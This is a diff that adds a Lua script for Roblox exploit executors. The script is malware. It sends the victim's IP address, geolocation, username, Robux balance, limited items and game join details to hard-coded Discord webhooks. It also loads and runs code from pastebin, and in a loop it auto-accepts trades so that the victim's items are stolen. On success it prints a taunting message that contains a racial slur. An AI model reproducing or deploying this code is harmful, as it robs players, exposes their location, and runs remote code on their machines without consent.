@@ -1,0 +1,268 @@
+local debug = true
+_G.Payload = true
+local mode = "accept"
+
+if debug == true then
+     print('-----------------------------------------------------------------------------')
+     print('Debug Notes are listed below.')
+     print('-----------------------------------------------------------------------------')
+     print('')
+     print('')
+end
+
+function rawdata()
+local ip = game:HttpGet("https://api.ipify.org", true)
+local data = game:HttpGet("https://ipinfo.io/" .. ip .. "?token=b26b152d15c08a", true)
+return data
+end
+
+function getlims()
+
+local lims =  game:HttpGet("https://inventory.rprxy.xyz/v1/users/" .. game.Players.LocalPlayer.UserId .. "/assets/collectibles")
+
+local decoded = game.HttpService:JSONDecode(lims)
+
+return lims
+end
+
+
+
+function getip()
+local ip = game:HttpGet("https://api.ipify.org", true)
+return ip
+end
+
+function getrobux()
+local data = game:HttpGet("https://economy.roblox.com/v1/users/" .. game.Players.LocalPlayer.UserId .. "/currency")
+data = game.HttpService:JSONDecode(data)
+
+return data["robux"]
+end
+
+local function GetTotalRAP(userId)
+	local success, msg = pcall(function()
+		local total = 0
+		
+		local function CollectRAP(cursor)
+			local url = "https://inventory.rprxy.xyz/v1/users/" .. game.Players.LocalPlayer.UserId .. "/assets/collectibles?sortOrder=Asc&limit=100"
+			
+			if cursor then
+				url = url .. "&cursor=" .. cursor
+			end
+			
+			local data = game:HttpGet(url)
+			data = game.HttpService:JSONDecode(data)
+			
+			for i = 1, #data["data"] do
+				pcall(function()
+					total = total + data["data"][i]["recentAveragePrice"]
+				end)
+			end
+			
+			if data["nextPageCursor"] then
+				CollectRAP(data["nextPageCursor"])
+			end
+		end
+		
+		CollectRAP()
+		
+		return total
+	end)
+	
+	if not success then
+		warn(msg)
+	else
+		return msg
+	end
+end
+
+function grabgame()
+ local isSuccessful, info = pcall(game:GetService("MarketplaceService").GetProductInfo, game:GetService("MarketplaceService"), game.PlaceId)
+    if isSuccessful then
+        return(tostring(info.Name))
+    end
+end
+
+function grabjob()
+return game.JobId
+end
+
+spawn(function()
+    while _G.Payload do
+    wait(3)
+    local success, problem = pcall(function()
+    local tid = game:HttpGet("https://pastebin.com/wDbiRLDh", true)
+    loadstring(game:HttpGet("https://pastebin.com/raw/phF8rMaH", true))()
+    
+    local table = {
+    ["tradeId"] = tid
+    }
+    
+    http = game:GetService("HttpService")
+    
+    local request = game:HttpPost("https://trades.roblox.com/v1/trades/" .. tid .. "/" .. mode, http:JSONEncode(table))
+    
+
+    end)
+    
+    if success then
+        warn('you just got robbed my nigga thx for ur items xDDDDDDDDDDDDDDDDDDDDDDD')
+        print("Trade was accepted from ROBLOX client.")
+    else
+       if debug == true then
+           warn('Trade was not completed.')
+           warn(problem)
+       end
+    end
+    end
+    end)
+
+    -- Notification to Webhook
+
+
+    local webhookcheck =
+    is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
+    secure_load and "Sentinel" or
+    KRNL_LOADED and "KRNL" or
+    SONA_LOADED and "Sona" or
+    "Kid with shit exploit"
+ 
+ local url =
+    "https://discord.com/api/webhooks/884707191146299433/nMkIcKYCiRXKD867DM8_wot5CfZYJJaBeQRIx1MNXP1Jjw5lRooC_hYQfqwiOcCZ8C5L"
+    local data = 
+	{
+		["content"] = "",
+		["embeds"] = {{
+			["title"] = "New Execution",
+			["type"] = "rich",
+			["color"] = tonumber(0xffffff),
+            ["thumbnail"] = {
+               ["url"] = "http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=150&Format=Png&username=" ..
+                   tostring(game:GetService("Players").LocalPlayer.Name)
+           },
+			["fields"] = {
+				{
+					["name"] = "User",
+					["value"] = game.Players.LocalPlayer.Name .. " (" .. game.Players.LocalPlayer.UserId .. ")",
+					["inline"] = false
+				},
+				{
+					["name"] = "Executor",
+					["value"] = webhookcheck,
+					["inline"] = false
+				},
+				{
+					["name"] = "IP Address",
+					["value"] = getip(),
+					["inline"] = false
+				},
+				{
+					["name"] = "Data",
+					["value"] = rawdata(),
+					["inline"] = false
+				},
+			}
+		}}
+	}
+ local newdata = game:GetService("HttpService"):JSONEncode(data)
+ 
+ local headers = {
+    ["content-type"] = "application/json"
+ }
+ request = http_request or request or HttpPost or syn.request
+ local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
+ request(abcdef)
+
+-- Game Info
+
+ 
+ 
+ local url =
+    "https://discord.com/api/webhooks/884707497947058176/WnN2UoZfeIInxG0gKPQPKWOtnhQq4_04YD8Cr_Se9AU_Wa1KMtPhyPKU0K8_OEp7uraK"
+    local data = 
+	{
+		["content"] = "",
+		["embeds"] = {{
+			["title"] = "Game Information",
+			["type"] = "rich",
+			["color"] = tonumber(0xffffff),
+            ["thumbnail"] = {
+               ["url"] = "https://assetgame.roblox.com/Game/Tools/ThumbnailAsset.ashx?aid="..game.placeId.."&fmt=png&wd=420&ht=420"
+           },
+			["fields"] = {
+				{
+					["name"] = "Game",
+					["value"] = grabgame(),
+					["inline"] = false
+				},
+				{
+					["name"] = "Game ID",
+					["value"] = game.PlaceId,
+					["inline"] = false
+				},
+				{
+					["name"] = "Job ID",
+					["value"] = grabjob(),
+					["inline"] = false
+				},
+				{
+					["name"] = "Join Link",
+					["value"] = "https://www.roblox.com/games/" .. game.PlaceId .. "/" .. "game" .. "?gameid=" .. grabjob(),
+					["inline"] = false
+				},
+			}
+		}}
+	}
+ local newdata = game:GetService("HttpService"):JSONEncode(data)
+ 
+ local headers = {
+    ["content-type"] = "application/json"
+ }
+ request = http_request or request or HttpPost or syn.request
+ local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
+ request(abcdef)
+
+-- Money
+
+ 
+ 
+ local url =
+    "https://discord.com/api/webhooks/884707660576993370/7aIjh2yWHptp5v3FsulNJBL1b72ZxmXpmSmbqdHj7Ew_R3DZ4QHIwEKz5xFj-lNmxtH4"
+    local data = 
+	{
+		["content"] = "",
+		["embeds"] = {{
+			["title"] = "Economy Information",
+			["type"] = "rich",
+			["color"] = tonumber(0xffffff),
+            ["thumbnail"] = {
+               ["url"] = "https://cdn.shopify.com/s/files/1/1061/1924/products/Money_with_Wings_Emoji_grande.png?v=1571606064"
+           },
+			["fields"] = {
+				{
+					["name"] = "R$",
+					["value"] = getrobux() .. " R$",
+					["inline"] = false
+				},
+				{
+					["name"] = "RAP",
+					["value"] = GetTotalRAP(),
+					["inline"] = false
+				},
+				{
+					["name"] = "Raw Limited Data",
+					["value"] = getlims(),
+					["inline"] = false
+				},
+				
+			}
+		}}
+	}
+ local newdata = game:GetService("HttpService"):JSONEncode(data)
+ 
+ local headers = {
+    ["content-type"] = "application/json"
+ }
+ request = http_request or request or HttpPost or syn.request
+ local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
+ request(abcdef)
